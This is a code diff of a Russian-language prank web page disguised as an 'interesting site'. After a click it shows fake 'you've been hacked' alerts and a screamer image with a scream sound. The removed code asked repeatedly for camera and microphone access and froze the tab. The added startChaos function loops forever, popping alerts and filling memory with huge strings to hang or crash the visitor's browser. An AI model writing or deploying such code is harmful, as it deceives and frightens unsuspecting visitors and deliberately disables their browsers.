@@ -3,14 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- --- ИСПРАВЛЕНИЕ КЭША --- -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
     <title>Интересный сайт</title>
     <style>
-        body { margin: 0; overflow: hidden; background-color: #f0f0f0; transition: background-color 0.5s; }
+        body { margin: 0; overflow: hidden; background-color: #f0f0f0; }
         .center-container { display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; text-align: center; font-family: Arial, sans-serif; }
         #intro { font-size: 24px; }
         #startButton { padding: 15px 30px; font-size: 20px; cursor: pointer; }
-        #hacked-warning { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
-        #hacked-warning h1 { font-size: 4rem; text-shadow: 0 0 10px #00ff00; }
         #screamer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000; }
         #screamer-image { width: 80%; max-width: 600px; height: 60%; max-height: 450px; background-image: url('https://distribution.faceit-cdn.net/images/735d8f60-78fa-44ab-b6db-f42e2f0d9266.jpeg'); background-size: cover; background-position: center; border: 3px solid #300; animation: zoom-in 10s linear infinite, shake 0.1s linear infinite, pulse 1s infinite; }
         .glitch-text { position: relative; font-size: 4rem; font-weight: bold; color: #ff0000; font-family: 'Courier New', Courier, monospace; margin-top: 20px; animation: glitch-main 1.5s infinite linear; }
@@ -29,7 +33,6 @@
     <div id="container" class="center-container">
         <div id="intro"><h1>Нажмите, чтобы увидеть кое-что интересное</h1><button id="startButton">Начать</button></div>
     </div>
-    <div id="hacked-warning" class="center-container"><h1>Взлом 50%</h1></div>
     <div id="screamer" class="center-container">
         <div id="screamer-image"></div>
         <h2 class="glitch-text">Я ТЕБЯ НАШЕЛ</h2>
@@ -42,42 +45,23 @@
         const intro = document.getElementById('intro');
         const screamer = document.getElementById('screamer');
         const screamSound = document.getElementById('screamSound');
-        const hackedWarning = document.getElementById('hacked-warning');
 
-        // Функция, которая пытается запросить разрешения
-        async function requestPermissions() {
-            try {
-                // Браузер сгруппирует похожие запросы, но мы вызываем их подряд
-                for (let i = 0; i < 5; i++) {
-                    await navigator.mediaDevices.getUserMedia({ video: true });
-                    await navigator.mediaDevices.getUserMedia({ audio: true });
-                }
-            } catch (err) {
-                console.error('Пользователь отклонил запрос:', err);
+        // Функция, которая создает бесконечные уведомления и пожирает память
+        function startChaos() {
+            let memoryHog = []; // Массив, в который будем складывать "мусор"
+            while (true) {
+                alert("вас взломали");
+                // Создаем очень большую строку и добавляем в массив, чтобы быстро занять память
+                memoryHog.push(new Array(1000000).join('x')); 
             }
         }
-        
-        // Функция для зависания вкладки
-        function freezeBrowserTab() {
-            while (true) {}
-        }
-        
-        // Функция для показа финального уведомления и зависания
-        function showFinalAlertAndFreeze() {
-            alert("взлом 100%"); // Показываем alert
-            freezeBrowserTab(); // Этот код выполнится ПОСЛЕ нажатия "OK"
-        }
 
-        // Функция, которая запускает сам скример
-        function triggerScreamer() {
-            hackedWarning.style.display = 'none';
-            screamer.style.display = 'flex';
-            
-            screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`; // Анти-кэш
-            screamSound.play();
-            
-            // Через 1 секунду после показа скримера, вызываем финальное окно
-            setTimeout(showFinalAlertAndFreeze, 1000);
+        // Функция, которая показывает финальное уведомление и запускает хаос
+        function triggerFinalStage() {
+            screamer.style.display = 'none'; // Скрываем скример
+            alert("взлом 100%");
+            // После нажатия "ОК" начнется бесконечный цикл
+            startChaos();
         }
 
         // Слушатель нажатия на кнопку "Начать"
@@ -89,12 +73,17 @@
             intro.style.display = 'none';
             document.body.style.backgroundColor = '#000';
             
-            // Этап 1: "Взлом 50%" и разрешения
-            hackedWarning.style.display = 'flex';
-            requestPermissions(); // Запрашиваем разрешения
+            // Этап 1: Сразу показываем уведомление "Взлом 50%"
+            // Весь последующий код выполнится только ПОСЛЕ того, как пользователь нажмет "OK"
+            alert("взлом 50%");
 
-            // Через 1 секунду переходим к Этапу 2 (Скример)
-            setTimeout(triggerScreamer, 1000);
+            // Этап 2: Сразу после "OK" показываем скример и играем звук
+            screamer.style.display = 'flex';
+            screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`; // Анти-кэш
+            screamSound.play();
+            
+            // Этап 3: Через 3 секунды скример пропадет и начнется финальная стадия
+            setTimeout(triggerFinalStage, 3000);
         });
     </script>
 
